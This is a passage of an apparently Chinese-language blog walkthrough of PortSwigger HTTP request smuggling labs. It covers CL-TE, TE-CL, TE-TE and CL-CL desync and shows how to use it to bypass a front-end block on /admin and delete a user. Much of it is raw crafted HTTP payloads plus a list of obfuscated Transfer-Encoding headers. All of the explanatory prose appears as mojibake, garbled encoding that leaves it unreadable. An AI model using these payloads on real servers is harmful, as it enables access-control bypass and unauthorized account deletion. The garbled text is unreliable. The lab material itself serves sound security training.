title="CLä¸ä¸º0"></a>CLä¸ä¸º0</h3><p>æ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“,è¿™é‡Œä»¥GETè¯·æ±‚ä¸ºä¾‹ã€‚</p><p>å½“å‰ç«¯æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„<code>Content-Length</code>å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚è¿™å°±æœ‰å¯èƒ½å¯¼è‡´è¯·æ±‚èµ°ç§ã€‚</p><p>æ¯”å¦‚æ„é€ è¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 44\r\n<br>\r\n<br>GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p><strong>æ³¨ï¼š\r\nè¡¨ç¤º CRLFå³æ¢è¡Œ</strong></p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†äº†Content-Lengthï¼Œè€Œåç«¯æœåŠ¡å™¨æ²¡æœ‰å¤„ç† Content-Length ï¼ŒåŸºäºpipelineæœºåˆ¶è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„è¯·æ±‚ï¼š</p><p>ç¬¬ä¸€ä¸ªè¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªè¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><h3 id="CL-CLæ¼æ´"><a href="#CL-CLæ¼æ´" class="headerlink" title="CL-CLæ¼æ´"></a>CL-CLæ¼æ´</h3><p><strong>RFC7230è§„èŒƒ</strong>ï¼šåœ¨RFC7230çš„<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">ç¬¬3.3.3èŠ‚</a>ä¸­çš„ç¬¬å››æ¡ä¸­ï¼Œè§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ªContent-Lengthï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ã€‚</p><p>æ„é€ è¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 5\r\n<br>Content-Length: 6\r\n<br>\r\n<br>12345\r\n<br>a<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å“åº”ï¼Œè¿”å›400 Bad Request<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185910-522340.png" alt="2"><br><strong>è§¦å‘è¿‡ç¨‹</strong></p><p>ä½†æ˜¯æ€»æœ‰æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼çš„å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºç«™æœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼çš„è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400é”™è¯¯ï¼Œä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ªContent-Lengthçš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºç«™æœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ªContent-Lengthçš„å€¼è¿›è¡Œå¤„ç†ã€‚</p><h3 id="CL-TEæ¼æ´"><a href="#CL-TEæ¼æ´" class="headerlink" title="CL-TEæ¼æ´"></a>CL-TEæ¼æ´</h3><p>CL-TEï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨åªå¤„ç†Content-Lengthè¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¼šéµå®ˆRFC2616çš„è§„å®šï¼Œå¿½ç•¥æ‰Content-Lengthï¼Œå¤„ç†Transfer-Encodingè¯·æ±‚å¤´ã€‚</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TEå®éªŒç¯å¢ƒ</a></p><blockquote><p>å®éªŒæè¿°ï¼š<br>æœ¬å®éªŒæ¶‰åŠå‰ç«¯å’Œåç«¯æœåŠ¡å™¨ï¼Œå¹¶ä¸”å‰ç«¯æœåŠ¡å™¨ä¸æ”¯æŒåˆ†å—ç¼–ç ï¼ˆTransfer-Encodingè§£æï¼‰ï¼Œå‰ç«¯æœåŠ¡å™¨æ‹’ç»æœªä½¿ç”¨GETæˆ–POSTæ–¹æ³•ä¹‹å¤–çš„è¯·æ±‚ã€‚</p><p>å®éªŒè¦æ±‚ï¼š<br>å°†è¯·æ±‚èµ°ç§åˆ°åç«¯æœåŠ¡å™¨ï¼Œä»¥ä¾¿åç«¯æœåŠ¡å™¨å¤„ç†çš„ä¸‹ä¸€ä¸ªè¯·æ±‚åƒæ˜¯ä½¿ç”¨äº†GPOSTæ–¹æ³•ã€‚</p></blockquote><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185934-758668.png" alt="labs1"><br>ç‚¹å‡»Access the labï¼Œè·³è½¬æ–°çš„é¡µé¢ï¼Œåœ¨æ–°çš„é¡µé¢è¿›è¡ŒæŠ“åŒ…<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190020-357686.png" alt="1"><br>å°†è¯·æ±‚è¡Œä¸­è¯·æ±‚æ–¹å¼ä¿®æ”¹ä¸ºPOST,åœ¨è¯·æ±‚è¡Œæ·»åŠ Transfer-<code>Encoding: chunked</code>ï¼Œç„¶ååœ¨å®ä½“ä¸­æ·»åŠ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G\r\n<br></code></pre></td></tr></table></figure><p>è¿ç»­å‘é€ä¸¤æ¬¡è¯·æ±‚å°±å¯ä»¥è·å¾—å“åº”ã€‚<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190033-562357.png" alt="2"><br>åˆ†æï¼šè¿ç»­è¯·æ±‚ï¼ŒGä¼šè¢«å¸¦å…¥ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå˜ä¸º <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>è§¦å‘è¿‡ç¨‹</strong></p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthå¤´å¹¶ç¡®å®šè¯·æ±‚ä¸»ä½“é•¿åº¦ä¸º6ä¸ªå­—èŠ‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G<br></code></pre></td></tr></table></figure><p>æ­¤è¯·æ±‚ç»è¿‡ä»£ç†æœåŠ¡å™¨è½¬å‘ç»™åç«¯æœåŠ¡å™¨æ—¶ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å®ƒè¯»å–åˆ°<code>0\r\n\r\n</code>æ—¶ï¼Œä¼šè¢«è®¤ä¸ºå·²ç»è¯»å–åˆ°ç»“å°¾äº†ï¼Œä½†æ˜¯å‰©ä¸‹çš„å­—æ¯Gå°±è¢«ç•™åœ¨äº†ç¼“å†²åŒºä¸­ï¼Œç­‰å¾…åç»­è¯·æ±‚çš„åˆ°æ¥ã€‚å½“æˆ‘ä»¬é‡å¤å‘é€è¯·æ±‚åï¼ŒGä¼šè¢«å¸¦å…¥ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå‘é€çš„è¯·æ±‚åœ¨åç«¯æœåŠ¡å™¨å˜ä¸º </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br></code></pre></td></tr></table></figure><p>æœåŠ¡å™¨åœ¨è§£ææ—¶ä¼šäº§ç”ŸæŠ¥é”™</p><h3 id="TE-TEæ¼æ´"><a href="#TE-TEæ¼æ´" class="headerlink" title="TE-TEæ¼æ´"></a>TE-TEæ¼æ´</h3><p>åœ¨è¿™é‡Œï¼Œå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¯¹æ ‡å¤´è¿›è¡ŒæŸç§æ–¹å¼çš„æ··æ·†æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</p><p>è¯¦è§ <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3.3</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">If a Transfer-Encoding header field is present <span class="hljs-keyword">in</span> a response and<br>the chunked transfer coding is not the final encoding, the<br>message body length is determined by reading the connection until<br>it is closed by the server.  If a Transfer-Encoding header field<br>is present <span class="hljs-keyword">in</span> a request and the chunked transfer coding is not<br>the final encoding, the message body length cannot be determined<br>reliably; the server MUST respond with the 400 (Bad Request)<br>status code and <span class="hljs-keyword">then</span> close the connection.<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ—å‡ºä¸ƒç§æ··æ·†æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Transfer-Encoding: xchunked<br><br>Transfer-Encoding : chunked<br><br>Transfer-Encoding: x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br>X: X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure><p>ä¹‹æ‰€ä»¥åœ¨å¤„ç†è¿™äº›è¯·æ±‚å¤´æ—¶ä¼šå‡ºç°é—®é¢˜ï¼Œæ˜¯å› ä¸ºåœ¨å®é™…çš„HTTPåè®®å®ç°ä¸­ï¼Œå¾ˆå°‘æœ‰ä»£ç ç²¾ç¡®çš„éµå¾ªäº†å…¶ä¸­çš„è§„èŒƒï¼Œä»¥æ­¤å¯¼è‡´é¢å¯¹å˜å½¢çš„è¯·æ±‚å¤´æ—¶ä¼šå‡ºç°ä¸åŒçš„å¤„ç†æ–¹å¼ã€‚è€Œæˆ‘ä»¬æ‰€è¦åšçš„å°±æ˜¯æ‰¾åˆ°å…¶ä¸­å­˜åœ¨é—®é¢˜çš„æœåŠ¡å™¨ï¼Œç„¶åä½¿ç”¨ç±»ä¼¼å‰ä¸¤ä¸ªæƒ…å½¢çš„æ”»å‡»æŠ¥æ–‡èµ°ç§æ•°æ®ã€‚</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.TEéªŒç¯å¢ƒ</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/185807-72744.png" alt="QQæˆªå›¾20210406190848"><br>æ„é€ è¯·æ±‚ï¼Œæ³¨æ„åŒæ ·éœ€è¦å»æ‰å‹¾é€‰Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>Transfer-encoding: cow\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>è¿ç»­å‘é€ä¸¤æ¬¡è¯·æ±‚<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190116-607083.png" alt="2"></p><p>åˆ†æï¼šå‰ç«¯å°†bodyçš„å†…å®¹è§†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œåˆ°äº†åç«¯ï¼Œå› ä¸º<code>Transfer-encoding: cow</code>æ— æ³•è¯†åˆ«ï¼Œå°†ä¼šè½¬è€Œä½¿ç”¨<code>Content-length: 4</code>ï¼Œä»è€Œäº§ç”ŸæŠ¥é”™</p><h3 id="TE-CLæ¼æ´"><a href="#TE-CLæ¼æ´" class="headerlink" title="TE-CLæ¼æ´"></a>TE-CLæ¼æ´</h3><p>æ‰€è°“TE-CLï¼Œå°±æ˜¯å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯ä»£ç†æœåŠ¡å™¨å¤„ç†Transfer-Encodingè¿™ä¸€è¯·æ±‚å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthè¯·æ±‚å¤´ã€‚</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CLéªŒç¯å¢ƒ</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190225-786616.png" alt="timu"><br>ç‚¹å‡»Access the labï¼Œè·³è½¬æ–°çš„é¡µé¢ï¼Œåœ¨æ–°çš„é¡µé¢è¿›è¡ŒæŠ“åŒ…<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190234-493978.png" alt="1"><br>è¿›å…¥å®éªŒï¼Œé¦–å…ˆéœ€è¦å»æ‰å‹¾é€‰Update Content-Lengthé˜²æ­¢Buprsuiteè‡ªåŠ¨æ›´æ–°Content-Lengthå­—æ®µ<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190250-681892.png" alt="0"><br>æ„é€ è¯·æ±‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>......<br>Transfer-Encoding: chunked\r\n<br>Content-Length: 3\r\n<br>\r\n<br>1\r\n<br>G\r\n<br>0\r\n<br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>è¿ç»­å‘é€ä¸¤æ¬¡è¯·æ±‚å¾—åˆ°å“åº”<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190306-543465.png" alt="2"><br>Gå’Œ0è¢«èµ°ç§äº†ï¼Œå¸¦å…¥äº†å¸¦å…¥ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡è¯·æ±‚æ–¹æ³•æ˜¯G0POSTï¼Œæˆ‘ä»¬éœ€è¦å®Œæ•´æ„é€ GPOSTæŠ¥æ–‡è¯·æ±‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>12\r\n<br>GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>è¿ç»­è¯·æ±‚ä¸¤æ¬¡<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190317-764210.png" alt="3"></p><p>å®˜æ–¹æä¾›çš„æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: your-lab-id.web-security-academy.net\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded\r\n<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>å¾—åˆ°å“åº”<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190337-171562.png" alt="4"><br><strong>è§¦å‘è¿‡ç¨‹</strong><br>ç”±äºå‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å…¶è¯»å–åˆ°0\r\n\r\næ—¶ï¼Œè®¤ä¸ºæ˜¯è¯»å–å®Œæ¯•äº†ï¼Œæ­¤æ—¶è¿™ä¸ªè¯·æ±‚å¯¹ä»£ç†æœåŠ¡å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthè¯·æ±‚å¤´ï¼Œå½“å®ƒè¯»å–å®Œ12\r\nä¹‹åï¼Œå°±è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å·²ç»ç»“æŸäº†ï¼Œåé¢çš„æ•°æ®å°±è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªè¯·æ±‚äº†ï¼Œä¹Ÿå°±æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>æˆåŠŸæŠ¥é”™ã€‚</p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingæ ‡å¤´ï¼Œå› æ­¤å°†æ¶ˆæ¯æ­£æ–‡è§†ä¸ºä½¿ç”¨åˆ†å—ç¼–ç ã€‚å®ƒå¤„ç†ç¬¬ä¸€ä¸ªå—ï¼Œå£°æ˜ä¸º12ä¸ªå­—èŠ‚é•¿ï¼Œç›´åˆ°ä¸‹ä¸€è¡Œçš„å¼€å§‹<code>GPOST / HTTP/1.1</code>ã€‚å®ƒå¤„ç†ç¬¬äºŒä¸ªæ•°æ®å—ï¼Œè¯¥æ•°æ®å—çš„é•¿åº¦ä¸ºé›¶ï¼Œå› æ­¤è¢«è§†ä¸ºç»ˆæ­¢è¯·æ±‚ã€‚è¯¥è¯·æ±‚è¢«è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ã€‚</p><p>åç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthæ ‡å¤´ï¼Œå¹¶ç¡®å®šè¯·æ±‚ä¸»ä½“çš„é•¿åº¦ä¸º4ä¸ªå­—èŠ‚ï¼Œç›´åˆ°ä¸‹ä¸€è¡Œçš„å¼€å§‹12ã€‚ä»¥ä¸‹ä»¥å¼€å¤´çš„å­—èŠ‚<code>GPOST / HTTP/1.1</code>æœªå¤„ç†ï¼Œåç«¯æœåŠ¡å™¨ä¼šå°†å…¶è§†ä¸ºåºåˆ—ä¸­ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹ã€‚</p><h2 id="ç»•è¿‡å‰ç«¯æœåŠ¡å™¨å®‰å…¨æ§åˆ¶"><a href="#ç»•è¿‡å‰ç«¯æœåŠ¡å™¨å®‰å…¨æ§åˆ¶" class="headerlink" title="ç»•è¿‡å‰ç«¯æœåŠ¡å™¨å®‰å…¨æ§åˆ¶"></a>ç»•è¿‡å‰ç«¯æœåŠ¡å™¨å®‰å…¨æ§åˆ¶</h2><blockquote><p>å®éªŒæè¿°ï¼š</p><p>æœ¬å®éªŒæ¶‰åŠå‰ç«¯å’Œåç«¯æœåŠ¡å™¨ï¼Œå¹¶ä¸”å‰ç«¯æœåŠ¡å™¨ä¸æ”¯æŒåˆ†å—ç¼–ç ã€‚å¤„æœ‰ä¸€ä¸ªç®¡ç†é¢æ¿/adminï¼Œä½†æ˜¯å‰ç«¯æœåŠ¡å™¨ç¦æ­¢è®¿é—®å®ƒã€‚</p><p>è¦è§£å†³æ­¤é—®é¢˜ï¼Œè¯·å°†è¯·æ±‚èµ°ç§åˆ°è®¿é—®ç®¡ç†é¢æ¿å¹¶åˆ é™¤ç”¨æˆ·çš„åç«¯æœåŠ¡å™¨carlosã€‚</p></blockquote><h3 id="åˆ©ç”¨CL-TEæ¼æ´ç»•è¿‡"><a href="#åˆ©ç”¨CL-TEæ¼æ´ç»•è¿‡" class="headerlink" title="åˆ©ç”¨CL-TEæ¼æ´ç»•è¿‡"></a>åˆ©ç”¨CL-TEæ¼æ´ç»•è¿‡</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">å®éªŒç¯å¢ƒ</a></p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190419-108405.png" alt="timu"></p><blockquote><p>å®éªŒæè¿°ï¼š</p><p>æœ¬å®éªŒæ¶‰åŠå‰ç«¯å’Œåç«¯æœåŠ¡å™¨ï¼Œå¹¶ä¸”å‰ç«¯æœåŠ¡å™¨ä¸æ”¯æŒåˆ†å—ç¼–ç ã€‚å¤„æœ‰ä¸€ä¸ªç®¡ç†é¢æ¿/adminï¼Œä½†æ˜¯å‰ç«¯æœåŠ¡å™¨ç¦æ­¢è®¿é—®å®ƒã€‚</p><p>è¦è§£å†³æ­¤é—®é¢˜ï¼Œè¯·å°†è¯·æ±‚èµ°ç§åˆ°è®¿é—®ç®¡ç†é¢æ¿å¹¶åˆ é™¤ç”¨æˆ·çš„åç«¯æœåŠ¡å™¨carlosã€‚</p></blockquote><p>æŒ‰ç…§è¦æ±‚è®¿é—®ç®¡ç†é¢æ¿/adminï¼Œä¼šæç¤ºPath /admin is blocked</p><p>åˆ©ç”¨CL-TEæ¼æ´ï¼Œæ„é€ æ•°æ®åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 37<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>å‘ç°åªèƒ½æœ¬åœ°ç”¨æˆ·æŸ¥çœ‹<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190431-281494.png" alt="1"><br>è¿ç»­ä¸¤æ¬¡å‘å‡ºä»¥ä¸‹è¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 54<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°ç”±äºç¬¬äºŒä¸ªè¯·æ±‚çš„Hostæ ‡å¤´ä¸ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­çš„èµ°ç§Hostæ ‡å¤´å†²çªï¼Œè¯¥è¯·æ±‚è¢«é˜»æ­¢ã€‚<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190443-9518.png" alt="2"><br>ä¸¤æ¬¡å‘å‡ºä»¥ä¸‹è¯·æ±‚ï¼Œä»¥ä¾¿å°†ç¬¬äºŒä¸ªè¯·æ±‚çš„æ ‡å¤´é™„åŠ åˆ°èµ°ç§çš„è¯·æ±‚æ­£æ–‡ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 116<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>ç°åœ¨å¯ä»¥è®¿é—®ç®¡ç†é¢æ¿</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190458-985555.png" alt="3"><br>æ ¹æ®å“åº”å†…å®¹ï¼Œæ›´æ”¹èµ°ç§çš„è¯·æ±‚URLä»¥åˆ é™¤ç”¨æˆ·carlosï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 139<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å›æ˜¾å†…å®¹ï¼Œä½¿ç”¨ä¸Šä¸ªæ•°æ®åŒ…è®¿é—®ç®¡ç†é¢æ¿ï¼ŒéªŒè¯æ˜¯å¦åˆ é™¤æˆåŠŸ<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190522-947042.png" alt="5"></p><h3 id="åˆ©ç”¨TE-CLæ¼æ´ç»•è¿‡"><a href="#åˆ©ç”¨TE-CLæ¼æ´ç»•è¿‡" class="headerlink" title="åˆ©ç”¨TE-CLæ¼æ´ç»•è¿‡"></a>åˆ©ç”¨TE-CLæ¼æ´ç»•è¿‡</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">å®éªŒç¯å¢ƒ</a><br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/190536-739950.png" alt="é¢˜ç›®"><br>è¿™æ¬¡åˆ©ç”¨TE-CLæ¼æ´ï¼Œæ„é€ æ•°æ®åŒ…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 